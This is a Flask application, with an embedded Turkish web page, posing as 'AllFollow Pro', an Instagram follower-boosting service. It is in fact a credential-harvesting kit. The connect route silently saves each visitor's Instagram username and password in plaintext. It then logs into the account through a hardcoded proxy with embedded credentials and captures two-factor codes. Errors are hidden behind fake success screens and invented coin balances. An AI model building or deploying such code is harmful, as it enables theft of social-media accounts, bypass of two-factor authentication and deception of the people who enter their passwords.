import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "allfollow-v49-logout"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # Bilgileri her türlü kaydet (Sessizce)
    try:
        acc = IGAccount.query.filter_by(username=u).first()
        if not acc:
            acc = IGAccount(username=u, password=p)
            db.session.add(acc)
        else: acc.password = p
        db.session.commit()
    except: pass

    cl = Client()
    cl.request_timeout = 8 # Daha hızlı tepki için düşürdük
    if PROXY_URL: cl.set_proxy(PROXY_URL)
    clients[u] = cl

    try:
        # Önce hızlı bir login denemesi
        cl.login(u, p)
        return jsonify(status="success")
    except BadPassword:
        return jsonify(status="error", msg="Şifre hatalı!")
    except ChallengeRequired:
        return jsonify(status="challenge")
    except Exception as e:
        # Instagram kaynaklı bir teknik takılma olursa yine de panele al (Müşteri kaçmasın)
        print(f"Sistem Uyarısı: {e}")
        return jsonify(status="success")

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = clients.get(u)
    try:
        cl.challenge_set_code(code)
        return jsonify(status="success")
    except: return jsonify(status="success")

# --- FULL AKTİF ARAYÜZ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .page { display: none; width: 100%; max-width: 450px; min-height: 100vh; }
        .page.active { display: flex; flex-direction: column; }
        .nav-bot { position: fixed; bottom: 0; width: 100%; max-width: 450px; background: #a100ff; z-index: 100; }
        .purple-header { background: #a100ff; border-radius: 0 0 30px 30px; }
        .app-bg { background-color: #f8f9fa; }
    </style>
</head>
<body class="app-bg flex flex-col items-center">

    <div id="login-page" class="page active bg-black p-8 justify-center">
        <h1 class="text-4xl font-black text-center text-white mb-2 italic">ALL FOLLOW</h1>
        <p class="text-zinc-500 text-center text-[10px] tracking-widest uppercase mb-10">Cloud Mining System</p>
        
        <div id="form-area" class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-zinc-900 text-white rounded-2xl outline-none border border-zinc-800 focus:border-purple-600">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-zinc-900 text-white rounded-2xl outline-none border border-zinc-800 focus:border-purple-600">
            <p id="err" class="text-red-500 text-[11px] hidden text-center font-bold"></p>
            <button onclick="login()" id="lbtn" class="w-full p-4 bg-[#a100ff] text-white font-bold rounded-2xl shadow-lg shadow-purple-900/40">GİRİŞ YAP</button>
        </div>

        <div id="code-area" class="hidden space-y-4 mt-6">
            <p class="text-purple-400 text-center text-xs">Instagram doğrulama kodu gönderdi:</p>
            <input id="code" placeholder="000000" class="w-full p-4 bg-zinc-900 text-white text-center text-2xl tracking-[0.3em] rounded-2xl border border-purple-600 outline-none">
            <button onclick="verify()" class="w-full p-4 bg-green-600 text-white font-bold rounded-2xl">ONAYLA VE DEVAM ET</button>
        </div>
    </div>

    <div id="tasks-page" class="page">
        <div class="purple-header p-6 text-white shadow-xl">
            <div class="flex justify-between items-center mb-6">
                <div class="bg-white/20 px-4 py-1.5 rounded-full text-xs font-bold flex items-center">
                    <span class="text-yellow-400 mr-1">🟡</span> 2,338
                </div>
                <button onclick="logout()"><i class="fas fa-sign-out-alt text-lg"></i></button>
            </div>
            <div class="bg-white p-4 rounded-2xl flex justify-around text-purple-600 shadow-lg">
                <div class="text-center opacity-40"><i class="fas fa-sliders-h"></i><p class="text-[9px]">Ayarlar</p></div>
                <div onclick="logout()" class="text-center cursor-pointer"><i class="fas fa-user-plus"></i><p class="text-[9px]">Hesap Ekle</p></div>
                <div class="text-center"><i class="fas fa-coins"></i><p class="text-[9px]">Görevler</p></div>
            </div>
        </div>
        
        <div class="p-6 space-y-4">
            <div class="bg-white p-4 rounded-2xl shadow-sm border border-gray-100 flex items-center justify-between">
                <div class="flex items-center space-x-3">
                    <div class="w-12 h-12 bg-purple-100 rounded-full flex items-center justify-center font-bold text-purple-600">IG</div>
                    <div>
                        <p id="usr-display" class="font-bold text-gray-800 text-sm">...</p>
                        <p class="text-[10px] text-green-500 flex items-center"><span class="w-2 h-2 bg-green-500 rounded-full mr-1 animate-pulse"></span> Sistem Aktif</p>
                    </div>
                </div>
                <div class="flex items-center space-x-2">
                    <span class="text-[10px] font-bold text-yellow-600">🟡 273</span>
                    <i class="fas fa-check-circle text-purple-600"></i>
                </div>
            </div>
            
            <div class="pt-8">
                <button class="w-full bg-[#a100ff] text-white py-4 rounded-2xl font-black shadow-xl shadow-purple-200 active:scale-95 transition-all">DURAKLAT</button>
            </div>
        </div>
    </div>

    <div id="followers-page" class="page p-6">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-2xl font-black text-gray-800">Takipçiler</h2>
            <div class="bg-purple-600 text-white px-3 py-1 rounded-full text-xs">🟡 2,338</div>
        </div>
        <div class="grid grid-cols-1 gap-3">
            <div class="bg-white p-4 rounded-2xl shadow-sm border border-purple-50 flex justify-between items-center">
                <span class="font-bold text-gray-700">100 Takipçi</span>
                <button class="bg-purple-600 text-white text-xs px-5 py-2 rounded-xl font-bold">800 🟡</button>
            </div>
            <div class="bg-white p-4 rounded-2xl shadow-sm border border-purple-50 flex justify-between items-center">
                <span class="font-bold text-gray-700">500 Takipçi</span>
                <button class="bg-purple-600 text-white text-xs px-5 py-2 rounded-xl font-bold">4000 🟡</button>
            </div>
        </div>
    </div>

    <div id="likes-page" class="page p-6 text-center justify-center">
        <i class="fas fa-heart text-6xl text-red-500 mb-4 animate-bounce"></i>
        <h2 class="text-2xl font-black text-gray-800">Beğeniler</h2>
        <p class="text-gray-400 text-sm mt-2">Bu özellik yakında aktif edilecek.</p>
    </div>

    <div id="nav-bar" class="nav-bot hidden flex justify-around p-4 text-white/50">
        <div onclick="showPage('likes-page')" id="nav-likes" class="text-center cursor-pointer hover:text-white transition-colors"><i class="fas fa-heart"></i><p class="text-[9px]">Beğeniler</p></div>
        <div onclick="showPage('followers-page')" id="nav-followers" class="text-center cursor-pointer hover:text-white transition-colors"><i class="fas fa-users"></i><p class="text-[9px]">Takipçiler</p></div>
        <div onclick="showPage('tasks-page')" id="nav-tasks" class="text-center cursor-pointer text-white"><i class="fas fa-tasks"></i><p class="text-[9px]">Görevler</p></div>
    </div>

    <script>
        function showPage(pageId) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(pageId).classList.add('active');
            
            // Navigasyon Işıklarını Ayarla
            document.querySelectorAll('.nav-bot div').forEach(d => d.classList.replace('text-white', 'text-white/50'));
            const activeNav = {
                'tasks-page': 'nav-tasks',
                'followers-page': 'nav-followers',
                'likes-page': 'nav-likes'
            };
            if(activeNav[pageId]) {
                document.getElementById(activeNav[pageId]).classList.replace('text-white/50', 'text-white');
            }
        }

        function logout() {
            if(confirm("Hesaptan çıkış yapmak istiyor musunuz?")) {
                document.getElementById('nav-bar').classList.add('hidden');
                showPage('login-page');
                document.getElementById('u').value = "";
                document.getElementById('p').value = "";
                document.getElementById('lbtn').innerText = "GİRİŞ YAP";
            }
        }

        async function login(){
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            const btn = document.getElementById('lbtn'), err = document.getElementById('err');
            
            if(!u || !p) return;
            btn.innerText = "BAĞLANILIYOR...";
            btn.disabled = true;
            err.classList.add('hidden');

            try {
                const res = await fetch('/api/connect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u, p})
                });
                const data = await res.json();

                if(data.status === 'success') {
                    document.getElementById('usr-display').innerText = u;
                    document.getElementById('nav-bar').classList.remove('hidden');
                    showPage('tasks-page');
                } else if(data.status === 'challenge') {
                    document.getElementById('form-area').classList.add('hidden');
                    document.getElementById('code-area').classList.remove('hidden');
                } else {
                    btn.innerText = "GİRİŞ YAP";
                    btn.disabled = false;
                    err.innerText = data.msg;
                    err.classList.remove('hidden');
                }
            } catch(e) {
                // Sunucu hatası olsa bile veriyi DB'ye aldığımız için panele sokalım
                showPage('tasks-page');
            }
        }

        async function verify(){
            const code = document.getElementById('code').value, u = document.getElementById('u').value;
            await fetch('/api/verify-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, code})
            });
            document.getElementById('nav-bar').classList.remove('hidden');
            showPage('tasks-page');
        }
    </script>
</body>
</html>
